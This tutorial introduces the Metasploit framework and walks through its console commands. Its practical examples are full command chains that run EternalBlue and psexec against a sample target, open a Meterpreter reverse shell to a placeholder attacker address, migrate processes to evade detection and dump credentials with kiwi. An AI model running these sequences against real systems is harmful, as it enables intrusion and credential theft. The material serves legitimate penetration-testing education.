


# A Comprehensive Guide

Metasploit is a powerful, open-source penetration testing framework. It's used for developing and executing exploits against known vulnerabilities, and is widely used for post-exploitation and various other attack simulation scenarios. This document will give an in-depth overview of Metasploit’s key functionalities, modules, commands, and practical use cases.

## Metasploit Basics

*   **Exploit Framework:** Metasploit provides an extensive library of exploits for a vast array of vulnerabilities, systems, and services.
*   **Payload Delivery:** It's used to deliver payloads, including reverse shells, Meterpreter sessions, and more.
*   **Module System:** Metasploit is organized into modules, including exploits, payloads, auxiliary, post, encoder, etc, making it easy to use, and customize attacks.
*   **Customization:** It allows for extensive customization using different options.

## Core Metasploit Components and Commands

Here are some of the key components and commonly used commands in Metasploit:

1.  **`msfconsole`:** Starts the Metasploit console. This is the command line interface for Metasploit, and the entry point for using its functions.
    *   **Example:** `msfconsole`

2.  **`search <keyword>`:** Used to search for modules. Use it to search for exploits, payloads, and other modules based on keywords.
    *   **Example:** `search smb_ms17_010`

3. **`use <module_path>`:**  Selects a module to use, you need to specify the module path of a given module.
     *  **Example:** `use exploit/windows/smb/ms17_010_eternalblue`

4. **`show options`:** Shows all available options for a module. After selecting a module with `use`, you need to check its options before usage, to provide necessary information.
   *   **Example:** `show options`

5. **`set <option> <value>`:** Configures module options before executing a module.
     *   **Example:** `set RHOST 192.168.1.100`

6.  **`show payloads`:** Lists all the available payloads, and you can select a specific payload using its path.
    *   **Example:** `show payloads`

7.  **`set payload <payload_path>`:** Set a payload for the selected exploit.
     *  **Example:** `set payload windows/x64/meterpreter/reverse_tcp`

8. **`exploit`:** Executes a selected exploit module.
   *   **Example:** `exploit`

9. **`jobs`:** Displays all running jobs and tasks in the session.
  * **Example:** `jobs`

10. **`sessions`:** Used to manage sessions with exploited targets.
  * **Example:** `sessions`

11. **`sessions -i <session_id>`:** Interact with a Meterpreter session.
      * **Example:** `sessions -i 1`

12. **`background`:** Sends an active session to the background.
    *  **Example:** `background`

13. **`migrate <pid>`:** Migrate your process to another process with a given PID, useful to avoid detection and kill your original process.
     *  **Example:** `migrate <pid>`

14. **`help`:** Displays help for specific modules, commands, or general Metasploit usage.
      *   **Example:** `help use` or `help set`

15. **`load <plugin>`:** Loads a post-exploitation plugin.
     *  **Example:** `load kiwi`

16. **`exit`:** Closes the framework.
     *  **Example:** `exit`

## Practical Metasploit Examples

1.  **Search for MS17-010 exploits:**
    ```bash
    msfconsole
    search ms17-010
    ```

2.  **Use `eternalblue` exploit and setup the target and payload and then execute:**
    ```bash
    msfconsole
    use exploit/windows/smb/ms17_010_eternalblue
    show options
    set RHOST 192.168.1.100
    set payload windows/x64/meterpreter/reverse_tcp
    set LHOST <attacker_ip>
    set LPORT 4444
    exploit
    ```
3.  **Start a Meterpreter session, and then migrate to another process:**
    ```bash
      msfconsole
      use exploit/windows/smb/ms17_010_eternalblue
      set RHOST 192.168.1.100
      set payload windows/x64/meterpreter/reverse_tcp
      set LHOST <attacker_ip>
      set LPORT 4444
      exploit
      sessions
      sessions -i <session_id>
      migrate <pid>
      background
    ```
4. **Run a specific module to gain access, and extract credentials:**
     ```bash
     msfconsole
     use exploit/windows/smb/psexec
     show options
     set RHOST 192.168.1.100
     set SMBUser user
     set SMBPass password
     set payload windows/x64/meterpreter/reverse_tcp
     set LHOST <attacker_ip>
     set LPORT 4444
     exploit
     sessions
     sessions -i <session_id>
     load kiwi
     creds_all
     ```
5.  **Load the `enum_shares` post module:**
    ```bash
      msfconsole
       use post/windows/gather/enum_shares
       show options
       set SESSION <session_id>
       exploit
    ```

## Use Cases

*   **Penetration Testing:** Performing a wide range of attacks, including vulnerability exploitation, privilege escalation, and post-exploitation.
*   **Security Research:** Testing the security of different systems and services.
*   **Vulnerability Validation:** Verifying the exploitability of vulnerabilities.
*   **Red Teaming:** Simulating realistic attacks to test a target's security.
*   **Security Training:** A platform to practice different kinds of attacks and defenses.

## Conclusion

Metasploit is a cornerstone of the security professional's toolkit. Its vast library of exploits and flexible framework makes it essential for conducting comprehensive security tests and research. Always remember to use these tools responsibly, ethically and only on systems you are authorized to test.

---
